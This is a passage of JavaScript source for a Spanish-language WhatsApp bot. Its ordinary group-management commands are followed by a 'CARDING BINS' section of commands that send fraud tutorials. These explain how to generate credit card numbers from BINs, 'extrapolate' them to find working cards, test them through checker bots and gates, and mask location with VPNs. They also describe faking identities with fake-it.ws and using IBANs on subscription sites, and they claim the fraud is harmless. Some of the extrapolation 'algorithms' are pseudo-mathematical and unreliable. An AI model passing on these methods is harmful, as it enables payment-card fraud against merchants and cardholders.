if (!isRegistered) return reply(ind.noregis())                
			if (args.length < 1) return reply(`Usa ${prefix}tag 52#######`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					cnf.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					cnf.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
case 'listadmins':
  case 'listadmin':
    case 'admin':
    case 'staff':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					if (!isGroup) return reply(mess.only.group)
					teks = `Lista de administradores del grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
       case 'listonline':
      case 'enlinea':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
             if (!isGroup) return reply(`*Solo puede ser usado en grupos*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(cnf.chats.get(ido).presences), cnf.user.jid]
             cnf.sendMessage(from, '*Lista de personas online:*\n\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
             /*
case 'joinn':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (isGroup && !itsMe) return reply('Solo se puede usar en chat privado!')
if (args.length < 1) return reply(`Usa *${prefix}join* link`)
if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
let code = args[0].replace('https://chat.whatsapp.com/', '')
cnf.acceptInvite(code)
 .then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
break
      case 'join': 
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
             if (args.length == 0) return reply(`Ejemplo : ${prefix}join https://chat.whatsapp.com/#######`)
             if (!c) return reply('*Donde esta el link?*')
             
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*El enlace no es válido*')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = cnf.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('*Listo*')
             break
             */
				case 'totag':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isGroup) return reply(mess.only.group)
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await cnf.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await cnf.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            cnf.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await cnf.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await cnf.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            cnf.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await cnf.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await cnf.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            cnf.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await cnf.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await cnf.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            cnf.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await cnf.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await cnf.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            cnf.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await cnf.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await cnf.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            cnf.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`Etiqueta una imagen/ documento/ gif/ sticker/ audio/ video`)
        }
        break
				case 'status':
				case 'estado':
case 'stats':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				var groups = cnf.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = cnf.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					const totalChat = await cnf.chats.all()
					const latensi = speed() - timestampu
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = cnf.user.phone
					stamtus = `⍟ ────────────────── ⍟

Chats privados : ${privat.length}
Chats grupales : ${groups.length}
Total Chat : ${totalChat.length}
Velocidad : ${latensi.toFixed(4)} second
Bateria : ${baterai.battery}
Cargado : ${baterai.isCharge}
Modo : ${publik ? 'public' : 'self'}
Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
Uso de RAM : ${ram2}
Nombre de host : ${os.hostname()}
Plataforma : ${os.platform()}
Tiempo de actividad : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Modelo de dispositivo: ${cnf.user.phone.device_model}
Manufactura : ${device_manufacturer}
Wa Version: ${cnf.user.phone.wa_version}
Android Version: ${cnf.user.phone.os_version}

⍟ ────────────────── ⍟`
reply(stamtus)
break
				case 'tobc':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				cnf.updatePresence(from, Presence.composing)
					anu = await cnf.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await cnf.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							cnf.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await cnf.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							cnf.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('Etiqueta sticker/audio')
							}
					break
                  
					case 'online':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
            if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				offline = false
				reply('Estado : ONLINE')
				break
			case 'offline':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
				reply('Función OFFLINE activada')
				break
/*
case 'tagall':
case 'todos':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : '*Info :*'
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
*/
	case 'tagall':
		if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())     
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : '╭❏ MENCIONANDO\n'
					// teks += '\n\n'
	 teks += '│\n'			
					for (let mem of groupMembers) {
						teks += `│⊷ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					teks += '│\n'
					teks += `╰❏ `
					reply(teks)
					break

            case 'hidetag':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
            ht = body.slice(9)
                members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
                mentions(ht, members_id, false)
                break


	case 'creditos':
	case 'credits':
	case 'credito':  
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
    hmm4 = fs.readFileSync(`./thub_1.jpg`)
imeu = await cnf.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await cnf.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "4626803044093248", 
  "title": 'JosephBot🥀',
"description": 'Remasterized by Joseph',
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "3545393872@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, 
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, 
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', 
				    sellerJid: `0@s.whatsapp.net` 
				   }
				  }
				 }
				})
  cnf.relayWAMessage(res)
  break

// CARDING BINS

// CARDING - BINS

				case 'queesunbin':
	  			case 'que_es_un_bin':
	  			case 'que-es-un-bin':
				if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())      
wiw = fs.readFileSync(`./media/queesunbin.jpeg`)
 queesunbin = `PARA LOS QUE NO SABEN HACER CUENTAS....ESTE ES UN TUTORIAL TEÓRICO PARA QUE SEPAN A LO QUE SE ESTAN METIENDO.

✅ ¿QUE ES UN BIN?

BIN: Bank Identification Number.

Un bin son los primeros 6 dígitos de una tarjeta de crédito. Estos nos sirven para identificar el país de procedencia, tipo de tarjeta y nivel de la misma.

Ejemplo: 553667

✅ ¿PARA QUE SIRVEN?

Con el bin puedes crear ccs (credit card) en español (tarjeta de crédito).Al generar la cc a base de bin puedes hacer suscripciones en páginas y hasta en ocasiones compras físicas. 

✅ ¿QUE ES UNA CC?

(CC=TARJETA DE CREDITO)

Primero debemos tener claro que una CC no es un BIN, una CC esta compuesta por información real.
Las CCs basicamente se componen por:

°Nombre
°Numero de la tarjeta
°CCV
°Fecha
°Dirección
°Código postal
°Pais
°Algunas traen numero telefónico y/o correo.

✅ ¿COMO RECONOCER EL TIPO DE TARJETA?

Pues Fácil. Observa:

La tarjeta comienza con el número 4 [Visa]

La tarjeta comienza con el número 5 [MasterCard]

La tarjeta comienza con el número 3 [Amex]

La tarjeta comienza con el número 6
[Discovey]

✅ ¿COMO CREAR UN BIN?

Un bin se hace a base de una cc real, solo debemos copiar los 6 primeros números de la cc y agregamos 10 equis (x)

Ejemplo: 4567812364745823

Bin: 456781xxxxxxxxxxx

Haciendo eso te pones a calar en páginas obvio con la misma ip de
la cc de la cual salió el bin.

✅ ¿EN QUE PAGINAS JALAN?

Bueno, esto es depende de donde sea el bin. Hay bins que jalan en una sola pagina ejemplo (crunchyroll) y hay otros que son multifuncionales ejemplo (crunchyroll, mubi, Napster y entre otras).

Posdata: solo tome esas páginas para el ejemplo.

✅ ¿COMO GENERAR UNA CC CON UN BIN?

existen varios generadores de ccs
que se encargan de remplazar las “x” por números que coincidan
con una cc.

El generador que yo usaré será Namso (https://namso-gen.com/)

INSERTE SU BIN: 548572xxxxxxxxxx

Y señalamos Fecha & CCV2 (si es todo generado)

Cantidad a crear 10 o las que quieran

Y le damos generar tarjetas.

✅ ¿QUE ES CHAVELO?

Se le denomina “Chabelo” a un bin que pese a que es viejo sigue funcionando en varias páginas.

✅ ¿Corremos riesgo al utilizar un bin?

Los BINS no son tan peligrosos, con la acción de “binear”, solo se estafa a la empresa en donde la usaste la cc generada.

Las tarjetas no son de dueños reales, solo son algoritmos, que de alguna manera pasan en una
página.

Lo más malo que te puede pasar, es que una página bloquee tu IP real permanentemente o tu dispositivo.

La otra cosa, es que tu IP puede estar en una lista negra de SPAM, eso es
provocado usualmente por VPN’s como Hola que vende este tipo de datos de sus usuarios a otras compañías, lo cual es algo que Hola no te especifica. Igual, hay muchos mejores VPN’s .

Es muy raro que pase, binear no es peligroso, si es que no abusas o llegas a un extremo muy pero muy elevado.

✅ ¿Qué es BAN?

Seguramente en los diversos grupos has escuchado esto, literalmente Ban significa prohibir esto es que se te pone una restricción; ya sea total, parcial, temporal o permanente, al sitio en donde has realizado la compra.

✅ ¿QUE ES UN VPN?

Una red privada virtual (RPV).
En inglés: Virtual Private Network (VPN), en pocas palabras VPN es algo que ayuda a que tu verdadera direccion IP quede cubierta, por ejemplo si tu eres de Argentina y un bin pide IP de Rusia, deberemos descargar un VPN como Tunnelbear para cambiar nuestra direccion a alli, los VPNs son faciles de usar y son una parte fundamental para usar bins, sin ellos no podremos usar la mayoria de ellos.
Existen varios vpns algunos son de paga, y otros gratuitos como Vyprvpn y tunnelbear entre otros. ZeroVPN, VyprVPN, TunnelBear, Hotspot Shield, HMA.

✅ ¿QUE ES IP?

IP = Internet Protocol, o simplemente tu dirección de Internet, todos nuestros dispositivos
conectados a internet poseen uno otorgado gracias a la red a la que estamos conectados. La IP en
algunos casos puede señalar la locación exacta en la que estamos ubicados.

✅ ¿QUE SON LIVES?
Las lives son tarjetas de crédito aprobadas por el mercado, es decir, tienen fondos. Estás sirven para hacer el pago con más seguridad.

✅ ¿QUE ES EXTRAPOLACIÓN?
Extrapolar es cuando sacamos un bin a partir de una tarjeta de credito existente, por ejemplo:

3764010x5xxx03x
37640101x526xxx
3764010xx5x6xx7
3764010xxx2xxx7

✅ ¿CÓMO EXTRAPOLAR UNA ‘CC’ GENERADA A PARTIR DE UN BIN?

Esto sirve para que vuelva a funcionar la tarjeta generada que utilizaste, es muy importante que la guardes, para que le vuelvas a dar una utilidad y disfrutar de ella. Tienes un bin, por ejemplo: 531321xxxxxxxxxx (Deezer Jalando), y con base a éste, generas un par de tarjetas. A partir de que generas dejan de llamarse bins y pasan a ser
tarjetas de crédito. Escoges una al azar por ejemplo: 5321321654829183

Te vas a la pagina de deezer y al registrar dicha tarjeta que hayas escogido, pasa al primer intento para crearla, pero después de un tiempo no funciona el bin.

Lo que haremos será extrapolar la tarjeta que pasó a la primera al crear la cuenta.

Lo haremos (extrapolar), eliminando los últimos 6 digitos de la tarjeta, Ejemplo: teníamos esta: 5321321654829183 y ahora pasa a ser esto:

5313216568xxxxxx

Generas de nuevo para calar en deezer y ya esta, volvió a pasar.`
    
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: queesunbin })									
                   break
                   
                   case 'extrapolacion':
					case 'extrapolación':
	  				case 'extrapolar':
					case 'extrapolarunbin':
					case 'extrapolar_un_bin':
					case 'extrapolar-un-bin':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())   
wiw = fs.readFileSync(`./media/extrapolarunbin.jpeg`)
 extrapolacion = `⚜ ¿QUE ES EXTRAPOLACIÓN? ⚜

Extrapolar es cuando sacamos un bin a partir de una tarjeta de credito existente, Por Ejemplo:

3764010x5xxx03x
37640101x526xxx
3764010xx5x6xx7
3764010xxx2xxxxx

Hay 3 métodos de extrapolación: básica,  y avanzada.

🔰 𝗕𝗔𝗦𝗜𝗖𝗔:

Consiste en 2 tipos de extrapolación:

Similitud. 
Activación.

✅ ACTIVACIÓN

Simplemente tomas una tarjeta Generada con tu bin carbon y cambias los ultimos 6 digitos por la letra 𝘅

Ejemplo:

Tarjeta Usada: 5292202302315781

Resultado: 5292202302xxxxxx 

✅ SIMILITUD

Requiere tener 2 CC del mismo BIN, que son:
 
T1: 5292203820803126
T2: 5292207483033368

Debemos separar los 6 primeros números de la CC:

[529220] [3820803126]
[529220] [7483033368]

Y, se van a fijar en el segundo grupo:

[3820803126] y [7483033368]

Después, van a comprobar SIMILITUDES entre estos dos, es decir, vas al segundo grupo que se separó:
 
[3820803126]
[7483033368]

Ordenarlas de este modo, y después, comparar.Si tienen el mismo número, se quedan iguales, si no, se reemplazan por una X, es decir:

T1: [3820803126]
T2: [7483033368]

Quedaria asi: [xxxxxx3xxx]

Ahora, juntas el bin con tu resultado: 

New Bin: 529220xxxxxx3xxx

Y ese es tu nuevo bin extrapolado

🔰 𝗔𝗩𝗔𝗡𝗭𝗔𝗗𝗔:

Esta es una compleja, pero muy buena para generar lives.
Muy poca gente la conoce, ya que esta fue extraída de el software de generación de tarjeta SoFlA de un banco b10*sum:

T1: 5292208177212441 
T2: 5292204657663815 

Para este método, debemos usar únicamente los 10 dígitos de dos CCs. 
Pero, como hago si las CCs tienen diferentes números? 
Bueno. Del tercer grupo, solo se usarán los 2 números de la tarjeta.

5292 2081 x72x xxxx 
5292 2081 x76x xxxx

Se suman

7+2= 09 
7+6= 13
 
A partir de estos resultado, se divide el número entre 2: 

7+2= 09÷2=4.5 
7+6= 13÷2=7.5 

Después, se multiplica por 5. 

7+2= 09÷2=4.5=22.5 
7+6= 13÷2=7.5 =37.5 

Si existe un decimal (.) y el número es de dos cifras, se borra el decimal. 

Y el resultado se suma: 

22+37 =59 

Así que terminaria:
 
5292 2081 59xx xxxx

✅ INDENTACION LOGICA:

5292208177212441
 
Debemos separar los 6 primeros números de la CC:

[ 529220] [8177212441]

Y, se van a fijar en el segundo grupo

[8177212441]

Después, este grupo lo deben separar en modo (3-4-3), es decir: 

[817] [7212] [441]

Y, eliminan el número central: 

[8x7] [7xx2 [4x1] 

Después, ordenan el BIN con el resto: 

Resultado Final: 5292208x77xx24x1

✅ MATERIALDINVERTER

Este es algoritmo privado el cual afecta a las tarjetas generadas después de mediados del 2017, fue tomado del software SoFlA del Banco de Bogotá. 

Este es el mas, mas complejo de todos y tiene un 100% de seguridad de sacar lives si lo usas bien. 

Este método requiere 2 CCs, las cuales comúnmente son expedidas entre Octubre 2016 a Febrero 2017. 
Así que:

T1: 5292208177212441 
T2: 5292204657663815

Tienes que separar T1 y T2 en 2 grupos de 8 digitos 

T1:[52922081 [77212441 
T2:[52922046 [57663815 

Ahora, vas a agarrar T2 y vas a ordenarlo del siguiente orden para poder multiplicarlo 
5×5= 25 
2×7= 14 
9×6= 54 
2×6= 12 
2×3= 6 
0×8= 0 
4×1= 4 
6×5= 30 

Vas a escribir cada resultado en una línea pegado: 
2514541260430

Como pueden ver, hay 13 números, debemos hacer que sean 8, así que borramos los últimos 

5 para que nos queden 8 que serían: 

Nos queda: 25145412 

Ahora, vamos a pegar el primer grupo con nuestro resultado: 

=5292204625145412 

Ahora, vamos a realizar extrapolación basica, similitud entre T1 y el resultado, por eso, separamos: 

T1: 5292208177212441 

R1: 5292204625145412 

Nuestro resultado seria: 529220xxxxxxx4xx 

Ahora, si el último dígito termina siendo una X, este se reemplaza por 1 

El resultado final sería: 529220xxxxxxx4x1`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: extrapolacion })									 
          break
          
          case 'extrapolacionhq':
case 'extrapolacion-hq':
case 'extrapolacion_hq':
case 'extrapolaciónhq':
case 'extrapolación-hq':
case 'extrapolación_hq':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`✅ METODO PARA SACAR LIVE FAST SIN BOT SIN NADA , Y PARA TENER LA CERTITUD QUE JALA O ESTA REALMENTE LIVE USA CAROL O CUALQUIER OTRO BOT O CHECKER WEB , SI TE DA DIED EL BIN NO SIRVE O LO HICISTE MAL 

4519912161013521|03|2026|618

CC : 451991216101 { 3521 } 
3+5= 8| ( 8+3 = 11)
2+1= 3 |

FECHA : ( 11 )

YEAR : ( 2026 = 20 ( 2 ) + 6 ) = 8
2026 = 202(8)

Cvv = 618 = 6/2=3+1=4+8=12
Cvv 618= 412 


CC final : 4519912161013521|11|2028|412

✅ NOTA EL METODO ESTA FULL Y LLEGA A SACAR CCS CON SALDO.`, MessageType.text, {quoted: mek})
  break
  
  case 'verificarunbin':
					case 'verificar_un_bin':
					case 'verificar-un-bin':
							if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/verificarunbin.jpeg`)
 verificarunbin = `Bueno geys. En esta oportunidad les enseñare a Verificar su BIN
Primero necesitaremos un BIN. La ves pasada les enseñe como sacarlo xd.

Para ahorrar toda esa clase usaremos al bot del grupo, bueno una ves obtenido el BIN ( 410453 ). 

Luego nos dirigimos a https://www.bincodes.com/bin-checker/

Una ves abierta la pagina. Buscamos el apartado Bank Identification o en español ( Número De Identificación ).Y ahi colocaremos nuestro BIN ( 410453 )

Ahora tendremos que validar,completar el Captcha.

Una ves hecho esto, damos clic en la opción CHEQUE.

Esperamos unos minutos y nos saldra la información de nuestro BIN.

Resultado de la validación de BIN

410453 es un BIN válido.

Detalles del BIN

COMPARTIMIENTO: 410453

Banco emisor: KEMBA CREDIT UNION, INC.

Marca de carro: VISA

Tipo de tarjeta: CRÉDITO

Nivel de tarjeta: CLÁSICO

Nombre de país: ESTADOS UNIDOS

BY: @JOSEPHBINNERZ`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: verificarunbin })									   
          break
          
          case 'queeslive':
			
case 'que_es_live':
case 'que-es-live':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
wiw = fs.readFileSync(`./media/queeslive.jpeg`)
 queeslive = `-Una live es una Cc que será aprobada en el lugar de donde es el bin

Una live igual es una cc que tiene fondos.

¿Cómo sacar una live?

Las Lives se pueden sacar de diferentes maneras

1- Una live se puede sacar desde un bot de Telegram ya sea gratuito o de paga, esos son los checkers spam [Anti Spam]

2- Otra forma de sacar una Live es comprando un checker web, esos son checkers que no tienen [Anti Spam] y puedes cargar varias ccs sin necesidad de esperar un molesto [Anti Spam]

¿Qué es un checker y cuanto valen?

-Un checker es un sistema el cual se encarga de verificar que una cc está live

-El precio de un checker varía de cada dueño del checker

¿Qué es un Gate? Un Gate es un lugar especifico para meter una cc, existen varios tipos de Gate como:

-Multigata

-CVV gate

-CCN GATE

¿Qué es CCN Y CVV?

-Una CCN es una cc que tiene correcto los 16 dígitos y la fecha correcta pero el código de seguridad es incorrecta

-Una CVV es una cc que tiene todo correcto

¿Para qué sirve una CVV?

La CVV sirve para hacer compras físicas u comprar algún servicio sin riesgo a que el mismo se caiga a las semanas o días.`
        cnf.sendMessage(from, wiw, image, { quoted: mek, caption: queeslive })									     
          break
          
        case 'iban':
	  case 'sepa':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`⚠️| Método Iban.

Bueno chicos hoy les voy a enseñar un metodo sencillo que puede sacarlos de un apuro, se llama Iban o Sepa...

¿Y que es esto?

El International Bank Account Number "Código Internacional de Cuenta Bancaria" en su traducción al español, es un código alfanumérico que identifica una cuenta bancaria determinada en una entidad financiera en cualquier lugar del mundo. 
Es decir, a cada cuenta le corresponde un único IBAN mediante el cual se identifica el país, la entidad, la oficina y la cuenta. 
Se trata de un estándar del Comité Europeo de Estándares Bancarios, que a su vez cumple con el estándar ISO 13616.

A continuación les mostrare una lista de países que usan este metodo (esta actualizada así que aprecienlo)

Caracteres Albania [🇦🇱]~[28]: AL35202111090000000001234567     
  Caracteres Andorra [🇦🇩]~[24] AD1400080001001234567890  
Caracteres Azerbaiyán [🇦🇿]~[28] AZ96AZEJ00000000001234567890         
 Caracteres Bahréin [🇧🇭]~[22] BH02CITI00001077181611  
Caracteres Bélgica [🇧🇪]~[16]
BE71096123456769  
Caracteres Bosnia [🇧🇦]~[20]: BA275680000123456789 
Caracteres Brasil [🇧🇷]~[29]: BR1500000000000010932840814P2          
 Caracteres Bulgaria [🇧🇬]~[22]:
BG18RZBB91550123456789 
Caracteres Costa Rica [🇨🇷]~[22] CR37012600000123456789  
Caracteres Dinamarca [🇩🇰]~[18]: DK9520000123456789 
Caracteres Alemania [🇩🇪]~[22]: DE91100000000123456789  
Caracteres Salvador [🇸🇻]~[28]:
SV43ACAT00000000000000123123     
 Caracteres Estonia [🇪🇪]~[20]:
EE471000001020145685    
Caracteres Finlandia [🇦🇽]~[18]:
FI1410093000123458  
Caracteres Francia [🇨🇵]~[27]: FR7630006000011234567890189   
  Caracteres Georgia [🇬🇪]~[22]:
GE60NB0000000123456789   
Caracteres Polonia [🇵🇱]~[28]:
PL10105000997603123456789123  
  Caracteres Portugal [🇵🇹]~[25]:
PT50002700000001234567833  
Caracteres Rumania [🇲🇩]~[24]:
RO09BCYP0000001234567890  
Caracteres Suiza [🇨🇭]~[21]:
CH5604835012345678009 
Caracteres Serbia [🇷🇸]~[22]
RS35105008123123123173    
Caracteres Eslovenia [🇸🇮]~[19] SI56192001234567892`, MessageType.text, {quoted: mek})
  
			
			case 'iban':
	  case 'sepa':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
cnf.sendMessage(from,`⚠️| Método Iban Parte ²

~Basicamente esa es la teoría de que es Iban 😛.

¿Para que funciona?

•Se utiliza como metodo alternativo al Bin, ya que puede que funcione de diferente manera en paginas destinadas a otros servicios como es el caso mas común con Napster.
 Su uso puede varias, ya es cuestión de ustedes Intentar.

Iba a utilizar Napster para enseñarles, pero Alemania fue baneada de sus servidores así que no funciona Pero no se preocupen cualquier pagina con un dominio Aleman o de los países anteriormente mostrados servira.

¿Que necesitamos para este metodo?

[✓] VPN activado en Alemania (puede que funcione cualquier VPN pero recomiendo uno como HMA).

[✓] Entrar en la página fake-it.ws y seleccionar la Bandera de Alemania.

[✓]  Intentar en sitios que acepten este tipo de pago. 

[1️⃣] En primer lugar con nuestro VPN Activado, ingresamos a fake-it.ws

[⚠️] Chicos las identidades falsas son clave en este mundo. 

[⚠️]Algunas paginas piden minimo algo de relación entre nombre y vivienda

[⚠️] Incluso numero de celular, que aunque no lo verifiquen puede llegar a molestar buscarlo.

[✓] Así que usen fake-it.ws

[✓] La interfaz de la pagina es bastante intuitiva,fácil de entender y usarla.`, MessageType.text, {quoted: mek})
  break
  
  case 'introduccionbins':
case 'introduccion_bins':
case 'introduccion-bins':
case 'introducciónbins':
case 'introducción_bins':
case 'introducción-bins':
						if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())  
wiw = fs.readFileSync(`./media/introduccionbins.jpg`)
 introduccionbins = `👑 introducción Bins

🔱 Glosario:

❑ ¿Qué es un Bin?

- Un bin son los 6 primeros números de una tarjeta lo cual identifica al banco y al tipo de tarjeta que es. Los bins nos permiten generar tarjetas de crédito o debito.

❒ ¿Donde encontrar bins?

- Los bins se pueden encontrar en grupos de whatsapp, facebook, twitter y telegram. Como son bins públicos, lo más probables es que esten quemados.

❒ ¿Cómo sacar bins funcionales?

